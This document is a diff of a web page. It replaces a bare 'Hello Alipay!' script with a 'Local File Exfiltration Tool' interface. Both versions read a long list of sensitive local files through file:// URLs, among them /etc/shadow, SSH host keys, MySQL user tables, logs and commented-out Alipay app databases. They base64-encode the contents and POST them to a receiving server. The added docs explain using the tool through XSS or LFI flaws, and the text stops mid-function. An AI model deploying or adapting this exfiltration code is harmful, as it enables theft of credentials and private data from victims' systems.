@@ -1,312 +1,1526 @@
-<div>
-  <h2>Hello Alipay!</h2>
-<script>
-var your_server_addr_ip = "http://127.0.0.1:8888/recv";
-function createXHR(){
-    if(typeof XMLHttpRequest != 'undefined'){
-        return new XMLHttpRequest();
-    }else if(typeof ActiveXObject != 'undefined'){
-        if(typeof arguments.callee.activeXString != 'string'){
-            var versions = ['MSXML2.XMLHttp.6.0','MSXML2.XMLHttp.3.0','MSXML2.XMLHttp'];
-            for(var i=0;i<versions.length;i++){
-                try{
-                    var xhr = new ActiveXObject(versions[i]);
-                    arguments.callee.activeXString = versions[i];
-                    return xhr;
-                }catch(ex){}
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Local File Reader - 1135</title>
+    <link rel="icon" type="image/x-icon" href="../../favicon.ico">
+    <link rel="stylesheet" href="../../css/style.css">
+    <style>
+        .main-content {
+            padding: 40px 20px;
+            max-width: 1000px;
+            margin: 0 auto;
+        }
+
+        .console-box {
+            background: #000;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            padding: 20px;
+            font-family: var(--font-mono);
+            font-size: 14px;
+            height: 600px;
+            overflow-y: auto;
+            color: var(--text-secondary);
+            box-shadow: var(--shadow-glow);
+        }
+
+        .log-entry {
+            margin-bottom: 5px;
+            border-bottom: 1px solid #1a1a1a;
+            padding-bottom: 2px;
+        }
+
+        .log-time {
+            color: #888;
+            margin-right: 10px;
+        }
+
+        .log-success {
+            color: var(--primary-color);
+        }
+
+        .log-error {
+            color: #e74c3c;
+        }
+
+        .log-info {
+            color: #3498db;
+        }
+
+        .controls {
+            margin-bottom: 20px;
+            display: flex;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .status-bar {
+            margin-top: 10px;
+            padding: 10px;
+            background: var(--surface-color);
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .section {
+            margin: 30px 0;
+            padding: 20px;
+            background: var(--surface-color);
+            border: 2px solid var(--border-color);
+            border-radius: 8px;
+        }
+
+        .section-title {
+            font-size: 18px;
+            font-weight: bold;
+            color: var(--primary-color);
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 2px solid var(--border-color);
+        }
+
+        .section-desc {
+            color: var(--text-secondary);
+            font-size: 13px;
+            margin-bottom: 15px;
+            line-height: 1.6;
+        }
+
+        .section-controls {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 15px;
+            align-items: flex-end;
+            margin-bottom: 15px;
+        }
+
+        .input-group {
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+
+        .input-group label {
+            font-size: 13px;
+            color: var(--text-secondary);
+            font-weight: 500;
+        }
+
+        .input-group input,
+        .input-group select {
+            padding: 8px 12px;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            background: var(--bg-color);
+            color: var(--text-color);
+            font-size: 14px;
+        }
+
+        .btn {
+            padding: 10px 20px;
+            background: var(--primary-color);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 500;
+            transition: all 0.3s;
+        }
+
+        .btn:hover {
+            opacity: 0.9;
+            transform: translateY(-1px);
+        }
+
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-test {
+            background: #27ae60;
+        }
+
+        .btn-test:hover {
+            background: #229954;
+        }
+
+        .btn-batch {
+            background: #3498db;
+        }
+
+        .btn-batch:hover {
+            background: #2980b9;
+        }
+
+        .test-results {
+            margin-top: 20px;
+            padding: 15px;
+            background: var(--bg-color);
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            display: none;
+        }
+
+        .test-results.show {
+            display: block;
+        }
+
+        .info-box {
+            padding: 12px;
+            background: rgba(52, 152, 219, 0.1);
+            border-left: 4px solid #3498db;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            font-size: 13px;
+            color: var(--text-secondary);
+        }
+
+        .warning-box {
+            padding: 12px;
+            background: rgba(241, 196, 15, 0.1);
+            border-left: 4px solid #f1c40f;
+            border-radius: 4px;
+            margin-bottom: 15px;
+            font-size: 13px;
+            color: var(--text-secondary);
+        }
+    </style>
+</head>
+
+<body>
+    <!-- 导航栏 -->
+    <div id="navigation-container"></div>
+
+    <div class="main-content">
+        <h1 data-i18n="localfile_title">Local File Exfiltration Tool</h1>
+        <p style="color: var(--text-secondary); margin-bottom: 20px;" data-i18n="localfile_desc">
+            Attempts to read sensitive local files via <code>file:///</code> protocol (requires vulnerable context) and
+            exfiltrate them to a server.
+        </p>
+
+        <!-- Section 1: Single File Test (Test All 5 Methods) -->
+        <div class="section">
+            <div class="section-title" data-i18n="localfile_section1_title">📊 单文件测试 - 对比所有5种方法</div>
+            <div class="section-desc" data-i18n="localfile_section1_desc">
+                选择一个文件，使用所有5种方法进行读取测试，对比各方法的成功率和性能表现。
+                适合验证不同方法在当前环境下的可用性。
+            </div>
+            
+            <div class="info-box" data-i18n="localfile_section1_info">
+                <strong>提示：</strong> 默认测试 <code>/etc/hosts</code> 文件。此测试不会发送数据到服务器，仅用于验证方法可用性。
+            </div>
+
+            <div class="section-controls">
+                <div class="input-group">
+                    <label for="test-file-input" data-i18n="localfile_test_file_label">测试文件路径：</label>
+                    <input type="text" id="test-file-input" value="/etc/hosts" 
+                           data-i18n-placeholder="localfile_test_file_placeholder" 
+                           placeholder="/etc/passwd" style="width: 300px;">
+                </div>
+                <button class="btn btn-test" id="test-all-btn" onclick="testAllMethods()" data-i18n="localfile_test_button">
+                    开始测试所有方法
+                </button>
+            </div>
+
+            <div id="test-results" class="test-results">
+                <h3 style="margin-top: 0; color: var(--primary-color);" data-i18n="localfile_test_results_title">测试结果</h3>
+                <div id="test-results-content" style="font-family: var(--font-mono); font-size: 12px; line-height: 1.8;">
+                    <!-- Test results will be displayed here -->
+                </div>
+            </div>
+        </div>
+
+        <!-- Section 2: Batch Exfiltration (Process All Files) -->
+        <div class="section">
+            <div class="section-title" data-i18n="localfile_section2_title">🚀 批量处理 - 读取所有文件并发送到服务器</div>
+            <div class="section-desc" data-i18n="localfile_section2_desc">
+                使用选定的方法批量读取所有文件列表，并将读取到的内容发送到指定的服务器。
+                适合实际的数据提取场景。
+            </div>
+
+            <div class="warning-box" data-i18n="localfile_section2_warning">
+                <strong>注意：</strong> 此操作会尝试读取所有文件并发送到服务器。请确保服务器地址正确，且已获得授权。
+            </div>
+
+            <div class="section-controls">
+                <div class="input-group">
+                    <label for="server-url" data-i18n="localfile_server_label">接收服务器地址：</label>
+                <input type="text" id="server-url" value="http://127.0.0.1:8888/recv"
+                           data-i18n-placeholder="localfile_server_placeholder"
+                           placeholder="http://your-server.com/recv" style="width: 350px;">
+            </div>
+                <div class="input-group">
+                    <label for="method-select" data-i18n="localfile_method_label">选择读取方法：</label>
+                    <select id="method-select" style="width: 250px;">
+                        <option value="xhr" data-i18n="localfile_method_xhr">1. XHR + FileReader (推荐)</option>
+                        <option value="fetch" data-i18n="localfile_method_fetch">2. Fetch API + Blob</option>
+                        <option value="iframe" data-i18n="localfile_method_iframe">3. iframe + contentWindow (仅文本)</option>
+                        <option value="text" data-i18n="localfile_method_text">4. FileReader.readAsText() (仅文本)</option>
+                        <option value="arraybuffer" data-i18n="localfile_method_arraybuffer">5. FileReader.readAsArrayBuffer()</option>
+                    </select>
+                </div>
+                <button class="btn btn-batch" id="batch-btn" onclick="startExfiltration()" data-i18n="localfile_batch_button">
+                    开始批量处理
+                </button>
+            </div>
+
+            <div style="margin-top: 15px; font-size: 12px; color: var(--text-secondary);">
+                <strong data-i18n="localfile_file_count">文件列表：</strong> <span id="file-count-text">0</span>
+            </div>
+        </div>
+
+        <div style="margin: 20px 0; padding: 15px; background: var(--surface-color); border: 1px solid var(--border-color); border-radius: 4px;">
+            <h3 style="margin-top: 0; color: var(--primary-color);">Technical Documentation</h3>
+            <div id="method-docs" style="color: var(--text-secondary); font-size: 13px; line-height: 1.6;">
+                <!-- Method documentation will be dynamically loaded here -->
+            </div>
+        </div>
+
+        <div class="console-box" id="console-output">
+            <div class="log-entry"><span class="log-time">[SYSTEM]</span> Ready to start.</div>
+        </div>
+
+        <div class="status-bar">
+            <span id="status-text">Idle</span>
+            <span id="progress-text">0 / 0</span>
+        </div>
+        <!-- 加载统一导航栏 -->
+        <script src="../../js/main.js"></script>
+        <script>
+            // 加载导航栏
+            const xhr = new XMLHttpRequest();
+            xhr.open('GET', '../../navigation.html', true);
+            xhr.onreadystatechange = function () {
+                if (xhr.readyState === 4 && xhr.status === 200) {
+                    document.getElementById('navigation-container').innerHTML = xhr.responseText;
+                }
+            };
+            xhr.send();
+
+            // Logger
+            function log(message, type = 'info') {
+                const consoleBox = document.getElementById('console-output');
+                const entry = document.createElement('div');
+                entry.className = 'log-entry';
+
+                const time = new Date().toLocaleTimeString();
+                const typeClass = type === 'success' ? 'log-success' : (type === 'error' ? 'log-error' : 'log-info');
+
+                entry.innerHTML = `<span class="log-time">[${time}]</span> <span class="${typeClass}">${message}</span>`;
+                consoleBox.appendChild(entry);
+                consoleBox.scrollTop = consoleBox.scrollHeight;
             }
-        }
-        return new ActiveXObject(arguments.callee.activeXString);
-    }else{
-        throw new Error('No XHR Object available');
-    }
-}
-// send POST Request
-function sendPostRequest(url,data,headers,callback){
-    var xhr  = createXHR();
-    xhr.onload = function(){
-        callback(xhr.responseText);
-    }
-    xhr.open('POST',url,false);
-    if(typeof(headers)=='object'){
-        for(var index in headers){
-            if(typeof(headers[index])!='function'){
-                xhr.setRequestHeader(index,headers[index]);
+
+            // Method Documentation
+            const methodDocs = {
+                xhr: `
+                    <strong>Method 1: XMLHttpRequest + FileReader (Current Implementation)</strong><br><br>
+                    <strong>Technical Flow:</strong><br>
+                    1. XMLHttpRequest sends GET request to file:// URL<br>
+                    2. responseType = 'blob' receives response as binary Blob object<br>
+                    3. FileReader.readAsDataURL() converts Blob to base64-encoded Data URL<br>
+                    4. Extract base64 string from Data URL (format: data:[mediatype][;base64],&lt;data&gt;)<br>
+                    5. URL-safe base64 encoding: replace + with -, / with _<br><br>
+                    <strong>Prerequisites & Validation:</strong><br>
+                    • <span style="color: #3498db;">Works in TWO scenarios:</span><br>
+                      &nbsp;&nbsp;1. <strong>file:// protocol:</strong> Direct local file access (Chrome/Edge may block by default)<br>
+                      &nbsp;&nbsp;2. <strong>Vulnerable web context:</strong> XSS/LFI vulnerability where server allows file:// URLs in requests<br>
+                    • <span style="color: #f39c12;">Note:</span> No need to check protocol - method works in both scenarios<br>
+                    • <span style="color: #f39c12;">Note:</span> In file:// context, same-origin policy limits to same directory/subdirectories<br>
+                    • <span style="color: #f39c12;">Note:</span> In web context, server-side vulnerability determines accessible files<br>
+                    • Status code: file:// returns 0 (not 200) - this is normal<br>
+                    • Supports: All file types (text, binary, images, etc.)<br>
+                    • <span style="color: #2ecc71;">Validation:</span> Test with a known file first (e.g., file:///etc/passwd on Linux)<br>
+                    • <span style="color: #2ecc71;">Validation:</span> If in web context, verify server accepts file:// URLs (LFI vulnerability)<br><br>
+                    <strong>Browser Compatibility:</strong> All modern browsers (Chrome/Edge file:// requires --allow-file-access-from-files flag OR vulnerable web context)
+                `,
+                fetch: `
+                    <strong>Method 2: Fetch API + Blob (Modern Alternative)</strong><br><br>
+                    <strong>Technical Flow:</strong><br>
+                    1. fetch() sends GET request to file:// URL<br>
+                    2. response.blob() converts response to Blob object<br>
+                    3. FileReader converts Blob to base64 (same as Method 1)<br><br>
+                    <strong>Prerequisites & Validation:</strong><br>
+                    • <span style="color: #3498db;">Works in TWO scenarios:</span><br>
+                      &nbsp;&nbsp;1. <strong>file:// protocol:</strong> Direct local file access<br>
+                      &nbsp;&nbsp;2. <strong>Vulnerable web context:</strong> XSS/LFI vulnerability allowing file:// URLs<br>
+                    • <span style="color: #f39c12;">Note:</span> Browser must support Fetch API (IE not supported)<br>
+                    • <span style="color: #2ecc71;">Validation:</span> Check typeof fetch !== 'undefined' before execution<br>
+                    • <span style="color: #2ecc71;">Validation:</span> No need to check protocol - works in both scenarios<br>
+                    • Status code: fetch() returns status 0 for file:// (same as XHR)<br>
+                    • Supports: All file types (text, binary, images, etc.)<br><br>
+                    <strong>Browser Compatibility:</strong> Chrome 42+, Firefox 39+, Safari 10.1+, Edge 14+ (NO IE)
+                `,
+                iframe: `
+                    <strong>Method 3: iframe + contentWindow (Text Files Only)</strong><br><br>
+                    <strong>Technical Flow:</strong><br>
+                    1. Create hidden iframe, set src to file:// URL<br>
+                    2. Access content via iframe.contentWindow.document<br>
+                    3. Extract text content (innerText/textContent)<br>
+                    4. Convert text to base64 using btoa()<br><br>
+                    <strong>Prerequisites & Validation:</strong><br>
+                    • <span style="color: #3498db;">Works in TWO scenarios:</span><br>
+                      &nbsp;&nbsp;1. <strong>file:// protocol:</strong> Direct local file access (browser-dependent)<br>
+                      &nbsp;&nbsp;2. <strong>Vulnerable web context:</strong> XSS/LFI vulnerability allowing file:// URLs<br>
+                    • <span style="color: #e74c3c;">CRITICAL:</span> Only works for TEXT files (HTML, TXT, JSON, XML, etc.)<br>
+                    • <span style="color: #e74c3c;">CRITICAL:</span> Cannot read binary files (images, executables, etc.)<br>
+                    • <span style="color: #f39c12;">Note:</span> Stricter same-origin policy than XHR/Fetch in file:// context<br>
+                    • <span style="color: #f39c12;">Note:</span> In web context, server-side vulnerability determines access<br>
+                    • <span style="color: #2ecc71;">Validation:</span> Check iframe.onload event fires (file exists and is readable)<br>
+                    • <span style="color: #2ecc71;">Validation:</span> Try-catch around contentWindow access (may throw SecurityError)<br>
+                    • <span style="color: #2ecc71;">Validation:</span> Verify content is text (not binary) before processing<br>
+                    • Limitation: Some browsers block iframe access to file:// URLs entirely<br><br>
+                    <strong>Browser Compatibility:</strong> Firefox (partial in file://), Chrome/Edge (blocked in file://, works in web context), Safari (blocked)
+                `,
+                text: `
+                    <strong>Method 4: FileReader.readAsText() (Text Files Only)</strong><br><br>
+                    <strong>Technical Flow:</strong><br>
+                    1. First obtain Blob via XHR/Fetch (same as Method 1/2)<br>
+                    2. FileReader.readAsText() directly reads text content (no base64 conversion needed)<br>
+                    3. Can specify character encoding (UTF-8, ISO-8859-1, etc.)<br><br>
+                    <strong>Prerequisites & Validation:</strong><br>
+                    • <span style="color: #3498db;">Works in TWO scenarios:</span><br>
+                      &nbsp;&nbsp;1. <strong>file:// protocol:</strong> Via XHR/Fetch (inherits their prerequisites)<br>
+                      &nbsp;&nbsp;2. <strong>Vulnerable web context:</strong> Via XHR/Fetch in XSS/LFI scenario<br>
+                    • <span style="color: #e74c3c;">CRITICAL:</span> Only works for TEXT files - binary files will be corrupted<br>
+                    • <span style="color: #2ecc71;">Validation:</span> Check file extension or MIME type before using this method<br>
+                    • <span style="color: #2ecc71;">Validation:</span> Verify text encoding matches file encoding (UTF-8, ASCII, etc.)<br>
+                    • Advantage: Direct text access, no base64 encoding overhead<br>
+                    • Disadvantage: Cannot handle binary files (use Method 1/2/5 instead)<br><br>
+                    <strong>Browser Compatibility:</strong> All modern browsers (same as FileReader API)
+                `,
+                arraybuffer: `
+                    <strong>Method 5: FileReader.readAsArrayBuffer() (Raw Binary Data)</strong><br><br>
+                    <strong>Technical Flow:</strong><br>
+                    1. First obtain Blob via XHR/Fetch (same as Method 1/2)<br>
+                    2. FileReader.readAsArrayBuffer() reads raw binary bytes<br>
+                    3. Convert ArrayBuffer to base64 manually (Uint8Array → String → btoa)<br>
+                    4. Most low-level approach - full control over binary data<br><br>
+                    <strong>Prerequisites & Validation:</strong><br>
+                    • <span style="color: #3498db;">Works in TWO scenarios:</span><br>
+                      &nbsp;&nbsp;1. <strong>file:// protocol:</strong> Via XHR/Fetch (inherits their prerequisites)<br>
+                      &nbsp;&nbsp;2. <strong>Vulnerable web context:</strong> Via XHR/Fetch in XSS/LFI scenario<br>
+                    • <span style="color: #f39c12;">Note:</span> Most complex method - requires manual base64 conversion<br>
+                    • <span style="color: #2ecc71;">Validation:</span> Check ArrayBuffer.byteLength > 0 after reading<br>
+                    • <span style="color: #2ecc71;">Validation:</span> Verify Uint8Array conversion succeeds<br>
+                    • Advantage: Full control over binary data, can implement custom encoding<br>
+                    • Use case: When you need to process binary data before encoding<br><br>
+                    <strong>Browser Compatibility:</strong> All modern browsers (same as FileReader API)
+                `
+            };
+
+            // Update documentation when method changes
+            function initMethodDocs() {
+                const methodSelect = document.getElementById('method-select');
+                const methodDocsDiv = document.getElementById('method-docs');
+                
+                if (!methodSelect || !methodDocsDiv) {
+                    // Retry if DOM not ready
+                    setTimeout(initMethodDocs, 100);
+                    return;
+                }
+                
+                function updateDocs() {
+                    const method = methodSelect.value;
+                    methodDocsDiv.innerHTML = methodDocs[method] || '';
+                }
+                
+                methodSelect.addEventListener('change', updateDocs);
+                updateDocs(); // Initial load
+                
+                // Show initial validation status
+                var validation = validatePrerequisites();
+                if (validation.errors.length > 0 || validation.warnings.length > 0) {
+                    log('=== Initial Prerequisite Check ===', 'info');
+                    validation.errors.forEach(function(error) {
+                        log('ERROR: ' + error, 'error');
+                    });
+                    validation.warnings.forEach(function(warning) {
+                        log('WARNING: ' + warning, 'info');
+                    });
+                } else {
+                    log('Prerequisites validated: All checks passed', 'success');
+                }
+
+                // Update file count
+                function updateFileCount() {
+                    if (typeof files !== 'undefined') {
+                        var fileCountText = document.getElementById('file-count-text');
+                        if (fileCountText) {
+                            if (typeof window.i18n !== 'undefined') {
+                                fileCountText.textContent = window.i18n('localfile_file_count_pending', { count: files.length });
+                            } else {
+                                fileCountText.textContent = '共 ' + files.length + ' 个文件待处理';
+                            }
+                        }
+                    }
+                }
+                
+                // Update file count when language changes
+                if (typeof window.addEventListener !== 'undefined') {
+                    // Use MutationObserver to detect when language changes
+                    var observer = new MutationObserver(function(mutations) {
+                        mutations.forEach(function(mutation) {
+                            if (mutation.type === 'attributes' && mutation.attributeName === 'lang') {
+                                setTimeout(updateFileCount, 100);
+                            }
+                        });
+                    });
+                    
+                    if (document.documentElement) {
+                        observer.observe(document.documentElement, {
+                            attributes: true,
+                            attributeFilter: ['lang']
+                        });
+                    }
+                }
+                
+                updateFileCount();
             }
-        }
-    }
-    xhr.send(data);
-}
-// send GET Request to read file and return base64(file_content)
-function sendGetRequestForB64File(url, filename, callback) {
-    var xhr = createXHR();
-    xhr.onload = function() {
-    var reader = new FileReader();
-        reader.onloadend = function() {
-            var result = reader.result;
-            var data = result.substr(result.search('base64,') + 'base64,'.length,result.length);
-            data = data.replace(/\+/g,'-').replace(/\//g, '_');
-            callback(filename, data);
-        }
-        reader.readAsDataURL(xhr.response);
-    };
-    xhr.open('GET', url);
-    xhr.responseType = 'blob';
-    xhr.send();
-}
-var files = Array(
-// linux files
-'/etc/passwd',
-'/etc/shadow',
-'/etc/aliases',
-'/etc/anacrontab',
-'/var/lib/mlocate/mlocate.db',
-'/proc/self/cmdline',
-'/etc/apache2/apache2.conf',
-'/etc/apache2/httpd.conf',
-'/etc/at.allow',
-'/etc/at.deny',
-'/etc/bashrc',
-'/etc/bootptab',
-'/etc/chrootUsers',
-'/etc/chttp.conf',
-'/etc/cron.allow',
-'/etc/cron.deny',
-'/etc/crontab',
-'/etc/cups/cupsd.conf',
-'/etc/exports',
-'/etc/fstab',
-'/etc/ftpaccess',
-'/etc/ftpchroot',
-'/etc/ftphosts',
-'/etc/groups',
-'/etc/grub.conf',
-'/etc/hosts',
-'/etc/hosts.allow',
-'/etc/hosts.deny',
-'/etc/httpd/access.conf',
-'/etc/httpd/conf/httpd.conf',
-'/etc/httpd/httpd.conf',
-'/etc/httpd/logs/access_log',
-'/etc/httpd/logs/access.log',
-'/etc/httpd/logs/error_log',
-'/etc/httpd/logs/error.log',
-'/etc/httpd/php.ini',
-'/etc/httpd/srm.conf',
-'/etc/inetd.conf',
-'/etc/inittab',
-'/etc/issue',
-'/etc/lighttpd.conf',
-'/etc/lilo.conf',
-'/etc/logrotate.d/ftp',
-'/etc/logrotate.d/proftpd',
-'/etc/logrotate.d/vsftpd.log',
-'/etc/lsb-release',
-'/etc/motd',
-'/etc/modules.conf',
-'/etc/motd',
-'/etc/mtab',
-'/etc/my.cnf',
-'/etc/my.conf',
-'/etc/mysql/my.cnf',
-'/etc/network/interfaces',
-'/etc/networks',
-'/etc/npasswd',
-'/etc/passwd',
-'/etc/php4.4/fcgi/php.ini',
-'/etc/php4/apache2/php.ini',
-'/etc/php4/apache/php.ini',
-'/etc/php4/cgi/php.ini',
-'/etc/php4/apache2/php.ini',
-'/etc/php5/apache2/php.ini',
-'/etc/php5/apache/php.ini',
-'/etc/php/apache2/php.ini',
-'/etc/php/apache/php.ini',
-'/etc/php/cgi/php.ini',
-'/etc/php.ini',
-'/etc/php/php4/php.ini',
-'/etc/php/php.ini',
-'/etc/printcap',
-'/etc/profile',
-'/etc/proftp.conf',
-'/etc/proftpd/proftpd.conf',
-'/etc/pure-ftpd.conf',
-'/etc/pureftpd.passwd',
-'/etc/pureftpd.pdb',
-'/etc/pure-ftpd/pure-ftpd.conf',
-'/etc/pure-ftpd/pure-ftpd.pdb',
-'/etc/pure-ftpd/putreftpd.pdb',
-'/etc/redhat-release',
-'/etc/resolv.conf',
-'/etc/samba/smb.conf',
-'/etc/snmpd.conf',
-'/etc/ssh/ssh_config',
-'/etc/ssh/sshd_config',
-'/etc/ssh/ssh_host_dsa_key',
-'/etc/ssh/ssh_host_dsa_key.pub',
-'/etc/ssh/ssh_host_key',
-'/etc/ssh/ssh_host_key.pub',
-'/etc/sysconfig/network',
-'/etc/syslog.conf',
-'/etc/termcap',
-'/etc/vhcs2/proftpd/proftpd.conf',
-'/etc/vsftpd.chroot_list',
-'/etc/vsftpd.conf',
-'/etc/vsftpd/vsftpd.conf',
-'/etc/wu-ftpd/ftpaccess',
-'/etc/wu-ftpd/ftphosts',
-'/etc/wu-ftpd/ftpusers',
-'/logs/pure-ftpd.log',
-'/logs/security_debug_log',
-'/logs/security_log',
-'/opt/lampp/etc/httpd.conf',
-'/opt/xampp/etc/php.ini',
-'/proc/cpuinfo',
-'/proc/filesystems',
-'/proc/interrupts',
-'/proc/ioports',
-'/proc/meminfo',
-'/proc/modules',
-'/proc/mounts',
-'/proc/stat',
-'/proc/swaps',
-'/proc/version',
-'/proc/self/net/arp',
-'/root/anaconda-ks.cfg',
-'/usr/etc/pure-ftpd.conf',
-'/usr/lib/php.ini',
-'/usr/lib/php/php.ini',
-'/usr/local/apache/conf/modsec.conf',
-'/usr/local/apache/conf/php.ini',
-'/usr/local/apache/log',
-'/usr/local/apache/logs',
-'/usr/local/apache/logs/access_log',
-'/usr/local/apache/logs/access.log',
-'/usr/local/apache/audit_log',
-'/usr/local/apache/error_log',
-'/usr/local/apache/error.log',
-'/usr/local/cpanel/logs',
-'/usr/local/cpanel/logs/access_log',
-'/usr/local/cpanel/logs/error_log',
-'/usr/local/cpanel/logs/license_log',
-'/usr/local/cpanel/logs/login_log',
-'/usr/local/cpanel/logs/stats_log',
-'/usr/local/etc/httpd/logs/access_log',
-'/usr/local/etc/httpd/logs/error_log',
-'/usr/local/etc/php.ini',
-'/usr/local/etc/pure-ftpd.conf',
-'/usr/local/etc/pureftpd.pdb',
-'/usr/local/lib/php.ini',
-'/usr/local/php4/httpd.conf',
-'/usr/local/php4/httpd.conf.php',
-'/usr/local/php4/lib/php.ini',
-'/usr/local/php5/httpd.conf',
-'/usr/local/php5/httpd.conf.php',
-'/usr/local/php5/lib/php.ini',
-'/usr/local/php/httpd.conf',
-'/usr/local/php/httpd.conf.ini',
-'/usr/local/php/lib/php.ini',
-'/usr/local/pureftpd/etc/pure-ftpd.conf',
-'/usr/local/pureftpd/etc/pureftpd.pdn',
-'/usr/local/pureftpd/sbin/pure-config.pl',
-'/usr/local/www/logs/httpd_log',
-'/usr/local/Zend/etc/php.ini',
-'/usr/sbin/pure-config.pl',
-'/var/adm/log/xferlog',
-'/var/apache2/config.inc',
-'/var/apache/logs/access_log',
-'/var/apache/logs/error_log',
-'/var/cpanel/cpanel.config',
-'/var/lib/mysql/my.cnf',
-'/var/lib/mysql/mysql/user.MYD',
-'/var/local/www/conf/php.ini',
-'/var/log/apache2/access_log',
-'/var/log/apache2/access.log',
-'/var/log/apache2/error_log',
-'/var/log/apache2/error.log',
-'/var/log/apache/access_log',
-'/var/log/apache/access.log',
-'/var/log/apache/error_log',
-'/var/log/apache/error.log',
-'/var/log/apache-ssl/access.log',
-'/var/log/apache-ssl/error.log',
-'/var/log/auth.log',
-'/var/log/boot',
-'/var/htmp',
-'/var/log/chttp.log',
-'/var/log/cups/error.log',
-'/var/log/daemon.log',
-'/var/log/debug',
-'/var/log/dmesg',
-'/var/log/dpkg.log',
-'/var/log/exim_mainlog',
-'/var/log/exim/mainlog',
-'/var/log/exim_paniclog',
-'/var/log/exim.paniclog',
-'/var/log/exim_rejectlog',
-'/var/log/exim/rejectlog',
-'/var/log/faillog',
-'/var/log/ftplog',
-'/var/log/ftp-proxy',
-'/var/log/ftp-proxy/ftp-proxy.log',
-'/var/log/httpd/access_log',
-'/var/log/httpd/access.log',
-'/var/log/httpd/error_log',
-'/var/log/httpd/error.log',
-'/var/log/httpsd/ssl.access_log',
-'/var/log/httpsd/ssl_log',
-'/var/log/kern.log',
-'/var/log/lastlog',
-'/var/log/lighttpd/access.log',
-'/var/log/lighttpd/error.log',
-'/var/log/lighttpd/lighttpd.access.log',
-'/var/log/lighttpd/lighttpd.error.log',
-'/var/log/mail.info',
-'/var/log/mail.log',
-'/var/log/maillog',
-'/var/log/mail.warn',
-'/var/log/message',
-'/var/log/messages',
-'/var/log/mysqlderror.log',
-'/var/log/mysql.log',
-'/var/log/mysql/mysql-bin.log',
-'/var/log/mysql/mysql.log',
-'/var/log/mysql/mysql-slow.log',
-'/var/log/proftpd',
-'/var/log/pureftpd.log',
-'/var/log/pure-ftpd/pure-ftpd.log',
-'/var/log/secure',
-'/var/log/vsftpd.log',
-'/var/log/wtmp',
-'/var/log/xferlog',
-'/var/log/yum.log',
-'/var/mysql.log',
-'/var/run/utmp',
-'/var/spool/cron/crontabs/root',
-'/var/webmin/miniserv.log',
-'/var/www/log/access_log',
-'/var/www/log/error_log',
-'/var/www/logs/access_log',
-'/var/www/logs/error_log',
-'/var/www/logs/access.log'
-// android files
-// 'databases/alipayclient.db',
-// 'databases/alipayclient.db-journal',
-// 'files/SGMANAGER_DATA2',
-// 'shared_prefs/alipay_tid_storage.xml',
-// 'shared_prefs/secuitySharedDataStore.xml'
-);
-var base_path = 'file:///';
-for(var each in files){
-    var file_path = base_path + files[each]
-    sendGetRequestForB64File(file_path,files[each],function(filename, response){
-        sendPostRequest(
-            your_server_addr_ip,
-            'name=' + escape(filename) + '&' + 'content=' + escape(response),
-            {"Content-type" : "application/x-www-form-urlencoded"},
-            function(a){}
-        );
-    });
-}
-</script>
-</div>
+            
+            // Initialize when DOM is ready
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', initMethodDocs);
+            } else {
+                initMethodDocs();
+            }
+
+            // Core Logic
+            function createXHR() {
+                if (typeof XMLHttpRequest != 'undefined') {
+                    return new XMLHttpRequest();
+                } else if (typeof ActiveXObject != 'undefined') {
+                    if (typeof arguments.callee.activeXString != 'string') {
+                        var versions = ['MSXML2.XMLHttp.6.0', 'MSXML2.XMLHttp.3.0', 'MSXML2.XMLHttp'];
+                        for (var i = 0; i < versions.length; i++) {
+                            try {
+                                var xhr = new ActiveXObject(versions[i]);
+                                arguments.callee.activeXString = versions[i];
+                                return xhr;
+                            } catch (ex) { }
+                        }
+                    }
+                    return new ActiveXObject(arguments.callee.activeXString);
+                } else {
+                    throw new Error('No XHR Object available');
+                }
+            }
+
+            function sendPostRequest(url, data, headers, callback) {
+                try {
+                    var xhr = createXHR();
+                    xhr.onload = function () {
+                        callback(xhr.responseText);
+                    }
+                    xhr.onerror = function () {
+                        log(`Failed to send data to server: ${url}`, 'error');
+                    }
+                    xhr.open('POST', url, true); // Changed to async true for better UI
+                    if (typeof (headers) == 'object') {
+                        for (var index in headers) {
+                            if (typeof (headers[index]) != 'function') {
+                                xhr.setRequestHeader(index, headers[index]);
+                            }
+                        }
+                    }
+                    xhr.send(data);
+                } catch (e) {
+                    log(`Error sending POST: ${e.message}`, 'error');
+                }
+            }
+
+            /**
+             * 方法1: XMLHttpRequest + FileReader (当前实现)
+             * 
+             * 技术原理：
+             * 1. XMLHttpRequest 发送 GET 请求到 file:// URL
+             * 2. 设置 responseType = 'blob' 将响应作为二进制 Blob 对象接收
+             * 3. FileReader.readAsDataURL() 将 Blob 转换为 base64 编码的 Data URL
+             * 4. 从 Data URL (格式: data:[<mediatype>][;base64],<data>) 中提取 base64 字符串
+             * 5. URL-safe base64 编码：将 + 替换为 -，/ 替换为 _
+             * 
+             * 关键点：
+             * - file:// 协议返回的 HTTP 状态码为 0（而非 200）
+             * - responseType = 'blob' 允许读取任意二进制文件（文本、图片、二进制等）
+             * - FileReader API 是异步的，需要监听 onloadend 事件
+             * 
+             * 限制：
+             * - 受浏览器同源策略限制（file:// 协议通常只能读取同目录或子目录文件）
+             * - 需要页面通过 file:// 协议打开（或存在 XSS/LFI 漏洞）
+             * - 某些浏览器可能阻止 file:// 协议的 XHR 请求
+             */
+            function sendGetRequestForB64File(url, filename, callback) {
+                try {
+                    var xhr = createXHR();
+                    xhr.onload = function () {
+                        if (xhr.status === 200 || xhr.status === 0) { // 0 for local files
+                            var reader = new FileReader();
+                            reader.onloadend = function () {
+                                var result = reader.result;
+                                if (result) {
+                                    // 提取 base64 部分：从 "data:...;base64," 之后的内容
